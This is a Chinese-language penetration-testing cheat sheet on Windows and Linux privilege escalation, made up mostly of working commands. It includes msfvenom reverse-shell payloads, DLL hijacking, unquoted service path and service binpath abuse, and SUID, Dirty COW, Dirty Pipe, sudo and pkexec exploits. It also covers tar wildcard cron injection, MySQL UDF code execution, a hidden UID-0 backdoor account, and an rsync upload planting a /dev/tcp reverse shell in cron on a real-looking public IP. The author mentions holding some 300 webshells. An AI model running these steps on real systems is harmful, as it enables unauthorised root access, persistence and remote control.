先用工具判断dll是否存在dll劫持

msf生成dll

~~~
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.43.237 lport=10001 -f dll >/opt/123.dll
~~~

替换dll

等待管理员触发exe

上线





#### 不带引号服务路径安全问题

~~~
//执行powershell脚本，查找不带引号的路径
.\jaws-enum.ps1
//或者
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """


//比如找到了如下：
c:/dasda dasdas/czxcz.exe
c:/dasdasda.exe
c:/dasdasda_cxvxc/123.pdf

那么只有第一个可以，存在空格
这样我们利用msf生成shellcode后重命名为dasda.exe，放在c:下，当服务重启就会以system权限执行
~~~



~~~
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.43.237 lport=10000 -f exe -o Program.exe
~~~



~~~
msf监听端口
收到回话
~~~



过程：检测引号服务路径-利用路径制作文件并上传-启用服务或重启-调用后成功

~~~
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
~~~

[![OrFZ6g.png](https://s1.ax1x.com/2022/05/13/OrFZ6g.png)](https://imgtu.com/i/OrFZ6g)

~~~
sc start "服务名"
~~~

https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk

#### 不安全的服务权限配置问题

~~~
D:\权限提升\AccessChk\accesschk.exe -uwcqv "administrators" *
accesschk.exe -uwcqv "administrators" *
(只能在本地，不能在webshell)
// 
.\jaws-enum.ps1

// 修改服务的配置
sc config "NewServiceName" binpath="C:\Program.exe"
// 上传msf的码到c盘下，改名为Program.exe
// msf监听
// 开启服务上线
sc start "NewServiceName"
~~~



### Linux提权

#### suid提权

~~~bash
// 查找是否可以利用suid提权
find / -user root -perm -4000 -print 2>/dev/null
~~~

[![pp6aAXQ.png](https://s1.ax1x.com/2023/03/28/pp6aAXQ.png)](https://imgse.com/i/pp6aAXQ)

~~~
// 上传LinEnum.sh，并执行
wget http://gitbook.batmanfuture.cn/gitbook/LinEnum.sh
chmod 777 LinEnum.sh
./LinEnum.sh
~~~

[![pp6wyFI.png](https://s1.ax1x.com/2023/03/28/pp6wyFI.png)](https://imgse.com/i/pp6wyFI)

~~~
// 或者换个脚本traitor-amd64检测
./traitor-amd64
~~~

[![pp605jO.png](https://s1.ax1x.com/2023/03/28/pp605jO.png)](https://imgse.com/i/pp605jO)

~~~
//说是存在cve-2022-0847
./traitor-amd64 --exploit kernel:CVE-2022-0847
~~~

[![pp607HH.png](https://s1.ax1x.com/2023/03/28/pp607HH.png)](https://imgse.com/i/pp607HH)

这里虽然我手上有300个左右现成的shell，但是存活的现在也不到一半了，linux的又一半，再去掉无法执行命令的，没有/dev/null目录等，竟然没找到一个

如果找到find的话：https://pentestlab.blog/2017/09/25/suid-executables/

[![pp6r1c6.png](https://s1.ax1x.com/2023/03/28/pp6r1c6.png)](https://imgse.com/i/pp6r1c6)

就可以提权了

#### 内核漏洞提权

##### 脏牛

~~~
// 比如上面那个linux机子，我们使用les.sh发现存在脏牛
wget http://gitbook.batmanfuture.cn/dcow.cpp
chmod 777 dcow.cpp
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil
//然后
./dcow
//就会重置密码
~~~

##### 脏管道



~~~
复现环境
	ubnutu 21.10 (内核 5.13-0.16)
~~~

~~~
exp:
	https://github.com/imfiver/cve-2022-0847
~~~

~~~
git clone https://github.com/imfiver/CVE-2022-0847.git
cd CVE-2022-0847
chmod +x Dirty-Pipe.sh
bash Dirty-Pipe.sh
~~~

我在我的kali上成功提权

[![Orn2kQ.png](https://s1.ax1x.com/2022/05/13/Orn2kQ.png)](https://imgtu.com/i/Orn2kQ)

~~~
还原
	rm -rf /etc/passwd
	mv /tmp/passwd /etc/passwd
~~~

~~~
添加root权限账户
useradd -p `openssl passwd -1 -salt 'whalwl' 123456` -u 0 -o -g root -G root -s /bin/bash -d /usr/bin/whalwl whalwl
~~~

[![pp6hXwt.png](https://s1.ax1x.com/2023/03/28/pp6hXwt.png)](https://imgse.com/i/pp6hXwt)

#### 环境变量

~~~
//1.获取suid

~~~



~~~
这个提权需要满足两个条件，1) 满足suid	2) 本地提权
~~~

~~~c
//
wget http://gitbook.batmanfuture.cn/demo.c
    
#include<unistd.h>
#include <string.h>
#include <fcntl.h>

void main()
{
    setuid(0);
    setgid(0);
    system("ps");
}
~~~

~~~shell
gcc demo.c -o shell
cp /bin/bash /tmp/ps
export PATH=/tmp:$PATH
./shell
id
~~~

#### 计划任务

~~~
// 打包文件backup.sh
// cd /tmp;tar czf /tmp/backup.tar.gz *

//执行
echo ""> --checkpoint=1
echo ""> "-–checkpoint-action=exec=sh test.sh"
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > test.sh
chmod +x test.sh

//执行计划任务生成的bash,然后：https://pentestlab.blog/2017/09/25/suid-executables/
./bash -p
~~~

[![pp6TTr4.png](https://s1.ax1x.com/2023/03/28/pp6TTr4.png)](https://imgse.com/i/pp6TTr4)



#### 配置不当

~~~
//原理和上面很相似，比如计划任务back.sh,正常应该给只读权限 chmod +x back.sh，但是管理员给了chmod 777 back.sh权限
那么我们普通用户就可以修改这个文件，命令改成反弹shell的命令，这样root权限就得到了


~~~



~~~java
start javaw -jar Multiple.Database.Utilization.Tools-2.1.1-jar-with-dependencies.jar


start javaw --module-path "D:\bind\javafx-sdk-16\lib" --add-modules=javafx.base --add-modules=javafx.controls --add-modules=javafx.fxml --add-modules=javafx.graphics --add-modules=javafx.media --add-modules=javafx.swing --add-modules=javafx.web -jar Multiple.Database.Utilization.Tools-2.1.1-jar-with-dependencies.jar
~~~



#### 数据库自动化提权

~~~
MUL
~~~



#### RSYNC未授权访问提权（873端口）

~~~
rsync rsync://39.101.116.6:873/
//下载文件
rsync rsync://39.101.116.6:873/etc/passwd ./
//上传文件nc,nc内容是：/bin/bash -i > /dev/tcp/124.70.20.10/8080 0<& 2>&1
chmod 777 nc
rsync -av nc rsync://39.101.116.6:873/src/etc/cron.hourly/
//借助修改计划任务的内容为反弹shell
~~~



~~~
https://www.cnblogs.com/zpchcbd/p/11696915.html
~~~



#### Docker未授权提权

~~~
// 判断当前是否有docker服务

//判断当前用户是否在docker组，只有在组内的才能运行docker服务，
groups root
group batman
// 启动docker服务，就是root权限
docker run -v /root:/mnt -it alpine
// -v将容器外部的目录/root挂载到容器内部的/mnt，使用-it参数进入容器shell

~~~



#### SUDO（CVE-2021-3156）

~~~
sudo: 1.8.2 - 1.8.31p2
sudo: 1.9.0 - 1.9.5p1
// 查看sudo版本
sudo --version
// 下载exp，编译，执行
git clone https://github.com/blasty/CVE-2021-3156.git
sudo apt install make
sudo apt install gcc
make
./sudo-hax-me-a-sandwich 1

// 判断是否存在漏洞
sudoedit -s /
// 查看内核
uname -a

~~~





#### poikit(CVE-2021-4034)

~~~
// 查看版本
dpkg -l policykit-1
// 利用
git clone https://github.com/berdav/CVE-2021-4034.git
cd CVE-2021-4034
make
./CVE-2021-4034
~~~











## Linux提权

-----------------------------------------------------------------------------------------------------------------------------------------------------------

[![IZIvh6.png](https://z3.ax1x.com/2021/11/04/IZIvh6.png)](https://imgtu.com/i/IZIvh6)

#### 信息收集

[shell脚本](https://github.com/rebootuser/LinEnum)，[python脚本](https://github.com/sleventyeleven/linuxprivchecker)

#### 漏洞探针

[suggest脚本](https://github.com/mzet-/linux-exploit-suggester)，[suggest脚本2](https://github.com/jondonas/linux-exploit-suggester-2)

上传到tmp目录，tmp是临时目录可读可写，记得chmod +x xxx给执行权限

### SUID提权

~~~
chmod u+s 给予了 suid
chmod u-s 删除了 suid
使程序在运行中受到了 suid root 权限的执行过程导致
~~~

提权过程：探针是否有 SUID(手工或脚本)-特定 SUID 利用-利用吃瓜-GG

https://pentestlab.blog/2017/09/25/suid-executables/

~~~
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
~~~

如果存在

~~~
Nmap	Vim		find	Bash	More	Less	Nano	cp 		mv		
~~~

后缀，那么存在给予了s权限

~~~
touch batmanfuture
find batmanfuture -exec whoami \;
find batmanfuture -exec netcat -lvp 10001 -e /bin/sh \;
~~~



### 内核漏洞

https://hub.fastgit.xyz/Jewel591/Privilege-Escalation

提权过程：连接-获取可利用漏洞-下载或上传 EXP-编译 EXP-给权限执行-GG

~~~shell
#	把这个.c文件上传到对方linux服务器
gcc 45010.c -o 45010
chmod +x 45010
./45010
id
~~~

### 脏牛提权

https://blog.csdn.net/qq_36119192/article/details/97248374

exp：https://hub.fastgit.xyz/gbonacini/CVE-2016-5195，dcow.cpp

~~~bash
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'	#	拿到一个交互shell
./dcow
~~~

[![bL6ROg.png](https://s1.ax1x.com/2022/03/14/bL6ROg.png)](https://imgtu.com/i/bL6ROg)

### 计划任务

#### 第一种：路径问题

利用计划任务指向的文件的相对路径解析问题

~~~shell
cat /etc/crontab
#	默认在/usr/local/bin里面
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/kali/test.sh
chmod +x /home/kali/test.sh
/tmp/bash
~~~

#### 第二种：命令问题

利用通配符配合命令参数自定义命令实现提权，不安全定时任务备份命令：

~~~
test.sh
shell
demo.c
backup.sh
--checkpoint-action=exec=sh test.sh
--checkpoint=1
当我们的定时认为执行backup.sh时，cd /home/undead/script;tar czf /tmp/backup.tar.gz *，这里的 * 就是通配符，当执行到--checkpoint=1时，这个checkpoint是crontab的打印进度条，最后执行exec=sh test.sh
这里会运行这个test.sh文件，我们这里可以在test.sh里面给/tmp/bash一个suid权限，然后
~~~

~~~shell
cd /home/undead/script;tar czf /tmp/backup.tar.gz *
#	这个第一条是我们普通权限查看crontab计划任务，如果发现了有计划任务里有如上备份文件内容，后有通配符
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/undead/script/test.sh
echo "" > "--checkpoint-action=exec=sh test.sh"
echo "" > --checkpoint=1
~~~

~~~
./bash -p
id
~~~

参考命令：https://www.cnblogs.com/manong--/p/8012324.html

#### 第三种：权限问题

利用不安全的权限分配操作导致的定时文件覆盖

~~~
正常我们对某文件给予执行权限是chmod +x shell.sh，但是如果管理员疏忽，执行了chmod 777 shell.sh，且该shell.sh是定时计划任务，那么我们就可以覆盖该文件，那么在计划任务执行该文件时，就会以root权限执行我们想执行的内容
~~~

~~~
可以首先查看定时任务： cat /etc/crontab
然后找到对应的目录执行命令查看该定时任务文件是否具备777权限：	ls -al
如果具备777权限，那么覆盖该文件，文件内容为你所执行的内容，比如：
ls >> /tmp/ls.txt	这样就是以root用户执行的内容，由此我们可以在里面写入反弹shell命令，拿到root的shell
~~~



### MYSQL-linux下提权

~~~
利用 Mysql 提权 searchsploit，下载 mysql udf poc 进行编译
wget https://www.exploit-db.com/download/1518
mv 1518 raptor_udf.c
gcc -g -c raptor_udf.c
gcc -g -shared -o raptor_udf.so raptor_udf.o -lc
mv raptor_udf.so 1518.so
~~~

~~~
wget https://xx.xx.xx.xx/1518.so
下载 1518 到目标服务器，进入数据库进行 UDF 导出

use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/1518.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';
创建 do_system 函数调用
create function do_system returns integer soname '1518.so'；
select do_system('chmod u+s /usr/bin/find');
配合使用 find 调用执行
touch xiaodi
find xiaodi –exec "whoami" \;
find xiaodi –exec "/bin/sh" \;
id
~~~

1.提权环境，信息收集(SUID,定时任务,可能漏洞，第三方服务应用等)

2.最新相关漏洞要明确(关注点)，二次开发相关脚本学会展望(四个脚本)

3.本地 searchsploit 脚本及远程 exploitdb 站点搜索说明（简要使用）

4.其他提权方法如：密码复用，guid，sudo 等说明(运气，同理，鸡肋等)

SUDO 说明参考：https://www.freebuf.com/vuls/217089.html涉及资源：

### sudo 误配提权-CVE-2021-3156

~~~
sudo 误配提权的一种利用手法是，查看 home/ 目录下是否 .sudo_as_admin_successful 文件，若有则可以输入当前低权账号的密码直接 sudo su 切换为 root 用户，而在已经获取当前账号的系统环境的前提下，要拿到低权账号的密码，虽然有门槛，但也不是不可能（如，翻找各类配置文件）
exp:
	https://github.com/Rvn0xsy/cve-2021-3156-plus
~~~

靶机 JIS-CTF-VulnUpload-CTF01 就是很好的一个案例。

首先，利用 web 漏洞拿到低权账号 technawi 的 meterpreter 会话：

[![bLcFXD.png](https://s1.ax1x.com/2022/03/14/bLcFXD.png)](https://imgtu.com/i/bLcFXD)

接着，翻找文件找到其密码：

[![bLcAne.png](https://s1.ax1x.com/2022/03/14/bLcAne.png)](https://imgtu.com/i/bLcAne)

然后，发现 home/ 中存在 .sudo_as_admin_successful 文件：

[![bLcE0H.png](https://s1.ax1x.com/2022/03/14/bLcE0H.png)](https://imgtu.com/i/bLcE0H)

最后，用 technawi 自己的密码切换为 root 用户：

[![bLceAA.png](https://s1.ax1x.com/2022/03/14/bLceAA.png)](https://imgtu.com/i/bLceAA)





~~~
复现环境
	ubnutu 21.10 (内核 5.13-0.16)
~~~

~~~
exp:
	https://github.com/imfiver/cve-2022-0847

~~~

~~~
git clone https://github.com/imfiver/CVE-2022-0847.git
cd CVE-2022-0847
chmod +x Dirty-Pipe.sh
bash Dirty-Pipe.sh
~~~

我在我的kali上成功提权

[![Orn2kQ.png](https://s1.ax1x.com/2022/05/13/Orn2kQ.png)](https://imgtu.com/i/Orn2kQ)

~~~
还原
	rm -rf /etc/passwd
	mv /tmp/passwd /etc/passwd
~~~

~~~
添加root权限账户
useradd -p `openssl passwd -1 -salt 'whalwl' 123456` -u 0 -o -g root -G root -s /bin/bash -d /usr/bin/whalwl whalwl 
~~~









































